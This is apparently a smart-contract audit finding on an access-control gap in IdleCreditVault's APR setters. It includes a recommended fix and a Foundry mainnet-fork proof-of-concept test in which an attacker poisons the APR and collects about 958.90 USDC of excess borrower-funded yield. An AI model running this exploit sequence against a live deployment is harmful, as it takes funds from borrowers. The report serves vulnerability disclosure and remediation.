### Title
Unauthenticated APR hijack before CDO binding lets an LP extract excess borrower yield - ([File: contracts/strategies/idle/IdleCreditVault.sol](contracts/strategies/idle/IdleCreditVault.sol))

### Summary
`IdleCreditVault.setAprs` is documented as CDO/manager-only, but delegates to `setApr`, which skips caller authorization entirely while `idleCDO == address(0)`. Between strategy initialization and `setWhitelistedCDO`, any EOA can poison both APR fields up to `maxApr`. The subsequent `IdleCDOEpochVariant` initializer treats the poisoned scaled APR as the intended unscaled APR and rescales it again. An attacker can therefore turn an intended 10% APR facility into a 20% APR facility before depositing, causing the honest borrower to fund roughly double the intended epoch yield.

### Finding Description
`IdleCreditVault.setAprs` updates `unscaledApr` and calls `setApr` for authorization [1](#0-0) . However, `setApr` only checks `msg.sender` after `idleCDO` has been configured; during setup it accepts any caller, subject only to `maxApr` [2](#0-1) . The strategy initializes `maxApr` to `DEFAULT_MAX_APR`, or 20% [3](#0-2) .

When the CDO is later initialized, `_additionalInit` calls `_setScaledApr(_getStrategyApr())` [4](#0-3) . `_getStrategyApr()` reads the already-poisoned `lastApr`, and `_setScaledApr` writes that value to `unscaledApr` while multiplying `lastApr` by `(epochDuration + bufferPeriod) / epochDuration` [5](#0-4) . Consequently, an attacker-supplied 20% `lastApr` becomes a 20% unscaled APR and approximately 23.33% scaled APR.

`startEpoch` derives `expectedEpochInterest` from this poisoned APR [6](#0-5) . At settlement or pool closure, `stopEpoch` pulls `expectedInterest + pendingWithdraws` from the borrower [7](#0-6) . With a 100,000-USDC pool, 30-day epoch, and 5-day buffer, the attacker-controlled 20% APR produces about 1,917.81 USDC expected interest rather than about 958.90 USDC at the intended 10% APR.

### Impact Explanation
A KYC-passing attacker can become the sole AA lender and receive approximately 958.90 USDC of excess borrower-funded yield per 100,000 USDC and per epoch under the stated parameters. This is direct unauthorized value extraction, not merely an incorrect configuration, because no privileged caller approved the poisoned APR.

The same primitive can also alter withdrawal routing because `requestWithdraw` compares `lastEpochApr` with `creditVault.unscaledApr()` and may select the instant-withdrawal branch [8](#0-7) .

### Likelihood Explanation
The exploit requires a deployment sequence in which `IdleCreditVault.initialize` and `setWhitelistedCDO` are not atomic. The repository's scripted/manual deployment flow performs strategy initialization, CDO initialization, and CDO whitelisting as separate calls [9](#0-8) . The factory path is atomic and not vulnerable to this gap [10](#0-9) .

No attacker role, malicious borrower, external oracle, or privileged-key compromise is needed. The attacker only sends a public `setAprs` transaction during the deployment/configuration gap and then uses the normal lender flow.

### Recommendation
Do not allow `setApr` or `setAprs` before `idleCDO` is configured unless `msg.sender == owner()` or `msg.sender == manager`. Preferably:

```solidity
if (idleCDO == address(0)) {
  if (msg.sender != owner() && msg.sender != manager) revert NotAllowed();
} else if (msg.sender != idleCDO && msg.sender != manager) {
  revert NotAllowed();
}
```

Alternatively, pass the CDO address to `initialize`, validate it, and set `idleCDO` atomically during initialization.

### Proof of Concept
The following Foundry test demonstrates the deployment-gap exploit on a mainnet fork. It uses USDC and the repository's deployed-test conventions.

```solidity
// test/foundry/AprSetupHijack.t.sol
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import {IdleCreditVault} from "../../contracts/strategies/idle/IdleCreditVault.sol";
import {IdleCDOEpochVariant} from "../../contracts/IdleCDOEpochVariant.sol";
import {IERC20Detailed} from "../../contracts/interfaces/IERC20Detailed.sol";

contract AprSetupHijackTest is Test {
  address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;

  address owner = makeAddr("owner");
  address manager = makeAddr("manager");
  address borrower = makeAddr("borrower");
  address attacker = makeAddr("attacker");
  address governance = makeAddr("governance");

  IdleCreditVault strategy;
  IdleCDOEpochVariant cdo;
  IERC20Detailed usdc = IERC20Detailed(USDC);

  function testUnauthorizedAprHijackBeforeWhitelisting() external {
    vm.createSelectFork("mainnet");

    strategy = new IdleCreditVault();
    // Reset implementation token marker the same way repository tests do.
    stdstore.target(address(strategy)).sig(strategy.token.selector).checked_write(address(0));

    // Intended borrower-facing APR: 10%.
    vm.prank(owner);
    strategy.initialize(USDC, owner, manager, borrower, "Borrower", 10e18);

    // Attacker reaches the privileged APR surface before idleCDO is set.
    // lastApr is capped at DEFAULT_MAX_APR = 20e18.
    vm.prank(attacker);
    strategy.setAprs(20e18, 20e18);

    cdo = new IdleCDOEpochVariant();
    stdstore.target(address(cdo)).sig(cdo.token.selector).checked_write(address(0));

    // CDO initialization treats poisoned lastApr as the intended unscaled APR
    // and scales it again by epoch+buffer.
    vm.prank(owner);
    cdo.initialize(
      0,
      USDC,
      governance,
      owner,
      makeAddr("rebalancer"),
      address(strategy),
      100_000
    );

    vm.prank(owner);
    strategy.setWhitelistedCDO(address(cdo));

    assertEq(strategy.unscaledApr(), 20e18);
    assertEq(strategy.getApr(), 20e18 * 35 days / 30 days);

    // Attacker is the sole AA lender.
    uint256 principal = 100_000e6;
    deal(USDC, attacker, principal);
    vm.startPrank(attacker);
    usdc.approve(address(cdo), principal);
    cdo.depositAA(principal);
    vm.stopPrank();

    // Honest manager starts the epoch.
    vm.prank(manager);
    cdo.startEpoch();

    uint256 poisonedInterest = cdo.expectedEpochInterest();
    uint256 intendedInterest =
      principal * (10e18 * 35 days / 30 days / 100) * 30 days / (365 days * 1e18);
    uint256 poisonedExpected =
      principal * (20e18 * 35 days / 30 days / 100) * 30 days / (365 days * 1e18);

    assertEq(poisonedInterest, poisonedExpected);
    assertApproxEqAbs(poisonedInterest - intendedInterest, 958.904e6, 1e6);

    // Honest borrower fully repays principal + poisoned expected interest.
    uint256 repayment = principal + poisonedInterest;
    deal(USDC, borrower, repayment);
    vm.prank(borrower);
    usdc.approve(address(cdo), repayment);

    vm.warp(cdo.epochEndDate() + 1);
    vm.prank(manager);
    cdo.stopEpoch(0, 1); // close pool and recall all funds

    // After pool closure, the receipt can be created and claimed immediately.
    vm.prank(attacker);
    uint256 requested = cdo.requestWithdraw(0, cdo.AATranche());
    assertEq(requested, principal + poisonedInterest);

    uint256 beforeClaim = usdc.balanceOf(attacker);
    vm.prank(attacker);
    cdo.claimWithdrawRequest();

    assertEq(usdc.balanceOf(attacker) - beforeClaim, requested);

    // Approximately 958.904 USDC above the intended 10% epoch yield.
    assertGt(requested, principal + intendedInterest);
  }
}
```
